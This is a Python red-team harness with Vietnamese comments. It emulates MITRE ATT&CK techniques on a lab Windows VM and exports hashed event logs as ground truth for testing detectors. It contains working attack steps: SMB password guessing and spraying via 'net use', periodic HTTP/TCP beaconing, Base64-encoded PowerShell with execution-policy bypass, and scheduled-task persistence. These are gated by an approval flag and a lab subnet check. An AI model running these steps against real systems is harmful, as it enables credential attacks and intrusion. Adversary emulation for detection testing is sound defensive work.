"""
run_campaign.py
===============
GlobalBan Red Team Harness - MITRE ATT&CK Adversary Emulation & Real OS Telemetry Exporter.
Chạy các kịch bản mô phỏng hành vi tấn công và bình thường chuẩn MITRE ATT&CK trên Windows VM,
tự động trích xuất log EVTX thật, tính mã băm SHA-256 chống chỉnh sửa và xuất file Ground-Truth.
"""

from __future__ import annotations

import argparse
import base64
import csv
import hashlib
import json
import os
import shutil
import socket
import subprocess
import time
from datetime import datetime, timezone
from pathlib import Path
from urllib.request import Request, urlopen

ROOT_DIR = Path(r"C:\redteam-harness\artifacts")
CHANNELS = {
    "Security": "Security.evtx",
    "Microsoft-Windows-PowerShell/Operational": "PowerShell.evtx",
    "Microsoft-Windows-Sysmon/Operational": "Sysmon.evtx",
    "Microsoft-Windows-Windows Defender/Operational": "Defender.evtx",
}


def utc_now() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def sha256_file(path: Path) -> str:
    h = hashlib.sha256()
    with path.open("rb") as f:
        for chunk in iter(lambda: f.read(8192), b""):
            h.update(chunk)
    return h.hexdigest().upper()


def export_evtx_and_hash(kind: str, case_id: str) -> list[str]:
    """Xuất file .evtx thật từ Windows Event Log và ghi mã băm SHA-256 ra file CSV."""
    dest_dir = ROOT_DIR / kind / case_id
    dest_dir.mkdir(parents=True, exist_ok=True)
    hash_dir = ROOT_DIR / "hashes"
    hash_dir.mkdir(parents=True, exist_ok=True)

    exported: list[str] = []
    hash_rows: list[dict[str, str]] = []

    for channel, filename in CHANNELS.items():
        out_file = dest_dir / filename
        if out_file.exists():
            try:
                out_file.unlink()
            except OSError:
                pass
        cmd = ["wevtutil.exe", "epl", channel, str(out_file)]
        res = subprocess.run(cmd, capture_output=True, text=True)
        if res.returncode == 0 and out_file.exists():
            digest = sha256_file(out_file)
            exported.append(filename)
            hash_rows.append({"Algorithm": "SHA256", "Hash": digest, "Path": str(out_file)})

    hash_csv = hash_dir / f"{case_id}.csv"
    with hash_csv.open("w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=["Algorithm", "Hash", "Path"])
        writer.writeheader()
        writer.writerows(hash_rows)

    return exported


def run_ps(script: str) -> tuple[int, str]:
    """Thực thi một đoạn script PowerShell với quyền bypass execution policy."""
    res = subprocess.run(
        ["powershell.exe", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", script],
        capture_output=True,
        text=True,
    )
    output = (res.stdout or "").strip()
    return res.returncode, output


# ==============================================================================
# CÁC KỊCH BẢN KIỂM THỬ THỰC TẾ GẮN NHÃN CHUẨN MITRE ATT&CK
# ==============================================================================

def case_baseline_normal() -> str:
    """Baseline: Tác vụ người dùng văn phòng bình thường (Mở app chuẩn, xem giờ, không bất thường)."""
    cmd = """
        whoami
        Get-Date | Out-Null
        $p = Start-Process notepad.exe -PassThru
        Start-Sleep -Seconds 2
        if ($p -and -not $p.HasExited) { Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue }
    """
    run_ps(cmd)
    return "whoami; Get-Date; notepad.exe (launched and cleanly closed)"


def case_t1082_system_info_discovery() -> str:
    """T1082: System Information Discovery - Chạy dồn dập systeminfo, hostname, ver trong < 2 giây."""
    cmd = """
        $t0 = [System.Diagnostics.Stopwatch]::StartNew()
        & cmd.exe /c "hostname & ver & systeminfo" | Out-Null
        $t0.Stop()
    """
    run_ps(cmd)
    return "cmd.exe /c 'hostname & ver & systeminfo' (burst executed in < 2s)"


def case_t1033_user_discovery() -> str:
    """T1033: System Owner/User Discovery - Chạy whoami /all, net user từ tiến trình con bất thường."""
    cmd = """
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "powershell.exe"
        $psi.Arguments = "-NoProfile -Command whoami /all; net user; net localgroup administrators"
        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $proc = [System.Diagnostics.Process]::Start($psi)
        $proc.WaitForExit(5000)
    """
    run_ps(cmd)
    return "whoami /all; net user; net localgroup administrators (spawned hidden process)"


def case_t1016_t1049_network_discovery() -> str:
    """T1016 & T1049: System Network Configuration & Connection Discovery - ipconfig, arp, netstat."""
    cmd = """
        & ipconfig.exe /all | Out-Null
        & arp.exe -a | Out-Null
        & netstat.exe -ano | Select-Object -First 15 | Out-Null
    """
    run_ps(cmd)
    return "ipconfig.exe /all; arp.exe -a; netstat.exe -ano"


def case_t1560_001_archive_staging() -> str:
    """T1560.001: Archive Collected Data via Utility - Gom file vào C:\\Temp\\attck_staging\\ và nén ZIP."""
    staging_dir = Path(r"C:\Temp\attck_staging")
    staging_dir.mkdir(parents=True, exist_ok=True)
    
    # Tạo các file dữ liệu mẫu
    (staging_dir / "confidential_accounts.txt").write_text("user=admin;token=SECRET999", encoding="utf-8")
    (staging_dir / "internal_network_map.log").write_text("192.168.52.136 Target Blue Host", encoding="utf-8")

    cmd = """
        $staging = "C:\\Temp\\attck_staging"
        $zipOut = "$staging\\data_exfil_sample.zip"
        if (Test-Path $zipOut) { Remove-Item $zipOut -Force }
        Compress-Archive -Path "$staging\\*.txt", "$staging\\*.log" -DestinationPath $zipOut -Force
        Start-Sleep -Seconds 1
    """
    run_ps(cmd)

    # Dọn dẹp an toàn sau khi tạo bằng chứng
    try:
        shutil.rmtree(staging_dir, ignore_errors=True)
    except OSError:
        pass

    return "Compress-Archive -Path C:\\Temp\\attck_staging\\* -DestinationPath data_exfil_sample.zip (cleaned up)"


def case_t1053_005_scheduled_task() -> str:
    """T1053.005: Scheduled Task/Job - Đăng ký tác vụ vô hại định kỳ bằng schtasks rồi tự dọn dẹp."""
    cmd = """
        schtasks.exe /create /tn "GlobalBanEvalTask" /tr "cmd.exe /c echo GlobalBanVerification" /sc once /st 23:59 /f | Out-Null
        Start-Sleep -Seconds 2
        schtasks.exe /delete /tn "GlobalBanEvalTask" /f | Out-Null
    """
    run_ps(cmd)
    return 'schtasks /create /tn "GlobalBanEvalTask" ... & schtasks /delete /tn "GlobalBanEvalTask" /f'


def case_t1071_001_c2_beaconing(target_ip: str) -> str:
    """T1071.001: Application Layer Protocol - Tạo kết nối HTTP định kỳ nhẹ (mỗi 5s) về Red Team."""
    for i in range(5):
        try:
            req = Request(f"http://{target_ip}:8000/run_campaign.py", headers={"User-Agent": "GlobalBan-Beacon/1.0"})
            with urlopen(req, timeout=3) as resp:
                _ = resp.read(128)
        except Exception:
            # Nếu cổng 8000 chưa mở hoặc chặn, thử socket TCP kết nối nhẹ
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2.0)
                s.connect((target_ip, 445))
                s.close()
            except Exception:
                pass
        time.sleep(5)
    return f"Periodic heartbeat beaconing (5 rounds, 5s interval) to {target_ip}"


def case_t1110_001_bruteforce(target_ip: str) -> str:
    """T1110.001: Password Guessing / Brute Force - Thử đăng nhập sai liên tiếp qua SMB -> sinh Event 4625."""
    for i in range(5):
        subprocess.run(
            ["net.exe", "use", f"\\\\{target_ip}\\IPC$", f"WrongPass_{i}!", "/user:redtest"],
            capture_output=True,
            text=True,
        )
        time.sleep(1.2)
    return f"net use \\\\{target_ip}\\IPC$ WrongPass_*! /user:redtest (5 logon failures -> Event 4625)"


def case_t1110_003_password_spray(target_ip: str) -> str:
    """T1110.003: Password Spraying - Thử 1 mật khẩu chung trên 5 tài khoản khác nhau qua SMB."""
    users = ["Administrator", "Guest", "alice", "bob", "redtest"]
    for u in users:
        subprocess.run(
            ["net.exe", "use", f"\\\\{target_ip}\\IPC$", "Summer@2026!", f"/user:{u}"],
            capture_output=True,
            text=True,
        )
        time.sleep(1.5)
    return f"Password spray: 5 users ({', '.join(users)}) on \\\\{target_ip}\\IPC$ with common password"


def case_t1087_001_local_account_discovery() -> str:
    """T1087.001: Local Account Discovery - net user & net localgroup administrators."""
    cmd = "net.exe user; net.exe localgroup administrators; net.exe localgroup 'Remote Desktop Users'"
    run_ps(cmd)
    return cmd


def case_context_deviation_off_hours() -> str:
    """Living-off-the-Land / Context Deviation: Lệnh Windows hợp lệ (powershell, ipconfig, arp) chạy ngoài giờ user_vanphong."""
    cmd = """
        & powershell.exe -NoProfile -Command "Get-Process | Select-Object -First 5; ipconfig /all | Out-Null; arp -a | Out-Null"
    """
    run_ps(cmd)
    return "powershell.exe recon (Context Deviation - Living-off-the-Land outside office hours)"


def case_t1059_001_encoded_powershell() -> str:
    """T1059.001: PowerShell Execution - Thực thi lệnh Base64 (-EncodedCommand) -> sinh Event 4688 & 4104."""
    payload = 'Write-Output "GlobalBan-Atomic-T1059.001-Verification-Payload"'
    b64 = base64.b64encode(payload.encode("utf-16le")).decode("ascii")
    run_ps(f"powershell.exe -NoProfile -EncodedCommand {b64}")
    return f"powershell.exe -NoProfile -EncodedCommand {b64[:30]}..."


# ==============================================================================
# HÀM ĐIỀU PHỐI CHÍNH (CAMPAIGN ORCHESTRATOR)
# ==============================================================================

def main() -> None:
    parser = argparse.ArgumentParser(description="GlobalBan MITRE ATT&CK Real Telemetry Red Team Harness")
    parser.add_argument("--target-ip", default="192.168.52.136", help="IP máy mục tiêu Blue Team (VMware NAT)")
    parser.add_argument("--approved", action="store_true", required=True, help="Xác nhận phê duyệt chạy trong Lab")
    parser.add_argument("--cooldown", type=int, default=8, help="Thời gian giãn cách giữa các ca kiểm thử (giây)")
    args = parser.parse_args()

    if not args.target_ip.startswith("192.168.52."):
        raise SystemExit("[ABORT] Safe-guard: Chỉ cho phép chạy trong dải mạng VMware NAT 192.168.52.0/24!")

    host = socket.gethostname()
    user = os.getenv("USERNAME", "lab-user")

    meta_dir = ROOT_DIR / "metadata"
    meta_dir.mkdir(parents=True, exist_ok=True)
    ground_truth_file = meta_dir / "red_ground_truth.json"
    cases_file = meta_dir / "cases.jsonl"

    # Danh mục kịch bản chuẩn hóa theo MITRE ATT&CK
    scenarios = [
        # (kind, case_id, tactic, tech_id, tech_name, expected_events, is_malicious, fn)
        (
            "baseline", "baseline-01", "initial-access", None,
            "Normal User Workstation Routine",
            [4688], False,
            case_baseline_normal,
        ),
        (
            "atomic", "atomic-T1082", "discovery", "T1082",
            "System Information Discovery (Burst Queries)",
            [4688], True,
            case_t1082_system_info_discovery,
        ),
        (
            "atomic", "atomic-T1033", "discovery", "T1033",
            "System Owner/User Discovery (Hidden Process)",
            [4688], True,
            case_t1033_user_discovery,
        ),
        (
            "atomic", "atomic-T1016-T1049", "discovery", "T1016",
            "System Network Configuration & Connection Discovery",
            [4688], True,
            case_t1016_t1049_network_discovery,
        ),
        (
            "atomic", "atomic-T1560-001", "collection", "T1560.001",
            "Archive Collected Data via Compress-Archive",
            [4688, 11], True,
            case_t1560_001_archive_staging,
        ),
        (
            "atomic", "atomic-T1053-005", "persistence", "T1053.005",
            "Scheduled Task Creation & Immediate Cleanup",
            [4688, 4698, 4699], True,
            case_t1053_005_scheduled_task,
        ),
        (
            "atomic", "atomic-T1071-001", "command-and-control", "T1071.001",
            "Application Layer Protocol Periodic Beaconing",
            [5156, 3], True,
            lambda: case_t1071_001_c2_beaconing(args.target_ip),
        ),
        (
            "atomic", "atomic-T1110-001", "credential-access", "T1110.001",
            "SMB Fast Password Guessing / Brute-Force",
            [4625], True,
            lambda: case_t1110_001_bruteforce(args.target_ip),
        ),
        (
            "atomic", "atomic-T1110-003", "credential-access", "T1110.003",
            "SMB Password Spraying Multi-Account",
            [4625], True,
            lambda: case_t1110_003_password_spray(args.target_ip),
        ),
        (
            "atomic", "atomic-T1087-001", "discovery", "T1087.001",
            "Account Discovery: Local Account & Admin Groups",
            [4688], True,
            case_t1087_001_local_account_discovery,
        ),
        (
            "atomic", "atomic-context-deviation-02am", "defense-evasion", "T1059-LivingOffTheLand",
            "Living-off-the-Land Context Deviation (Valid tools off-hours)",
            [4688], True,
            case_context_deviation_off_hours,
        ),
        (
            "atomic", "atomic-T1059-001", "execution", "T1059.001",
            "PowerShell Base64 Obfuscated Execution",
            [4688, 4104], True,
            case_t1059_001_encoded_powershell,
        ),
    ]

    print("=" * 80)
    print(f" GLOBALBAN RED TEAM HARNESS - MITRE ATT&CK ADVERSARY EMULATION")
    print(f" Source Host : {host} | Target Host: {args.target_ip}")
    print(f" Output Root : {ROOT_DIR}")
    print("=" * 80)

    ground_truth_records: list[dict] = []
    cases_lines: list[str] = []

    for idx, (kind, case_id, tactic, tech_id, tech_name, exp_events, is_malicious, fn) in enumerate(scenarios, start=1):
        print(f"\n[{idx}/{len(scenarios)}] Đang thực thi: {case_id} | {tech_id or 'BASELINE'} - {tech_name}")
        start_utc = utc_now()
        
        executed_cmd = fn()
        
        time.sleep(3)  # Đợi Windows flushes buffers xuống các kênh EVTX
        end_utc = utc_now()

        exported_files = export_evtx_and_hash(kind, case_id)

        record = {
            "step_id": idx,
            "case_id": case_id,
            "tactic": tactic,
            "technique_id": tech_id,
            "technique_name": tech_name,
            "executed_command": executed_cmd,
            "start_timestamp_utc": start_utc,
            "end_timestamp_utc": end_utc,
            "expected_windows_event_ids": exp_events,
            "is_malicious": is_malicious,
            "expected_detected": is_malicious,
            "host": host,
            "username": user,
            "target_ip": args.target_ip,
            "log_path": f"{kind}/{case_id}",
            "artifact_path": f"artifacts/{kind}/{case_id}",
            "exported_channels": exported_files,
        }

        ground_truth_records.append(record)
        cases_lines.append(json.dumps(record, ensure_ascii=False))

        print(f"    [+] Khung giờ UTC  : {start_utc} -> {end_utc}")
        print(f"    [+] Log xuất được  : {exported_files}")
        print(f"    [+] Băm SHA-256    : hashes/{case_id}.csv (xác thực toàn vẹn)")

        if idx < len(scenarios):
            time.sleep(args.cooldown)

    # Xuất file Ground-Truth chuẩn red_ground_truth.json và cases.jsonl
    ground_truth_file.write_text(json.dumps(ground_truth_records, indent=2, ensure_ascii=False), encoding="utf-8")
    cases_file.write_text("\n".join(cases_lines) + "\n", encoding="utf-8")

    print("\n" + "=" * 80)
    print(f"[✓] HOÀN TẤT CHIẾN DỊCH KIỂM THỬ THỰC TẾ!")
    print(f"[✓] File Ground-Truth JSON : {ground_truth_file.resolve()}")
    print(f"[✓] File Metadata JSONL    : {cases_file.resolve()}")
    print(f"[✓] Tổng số kỹ thuật chạy : {len(scenarios)} (1 Baseline + {len(scenarios)-1} ATT&CK Techniques)")
    print("=" * 80)


if __name__ == "__main__":
    main()
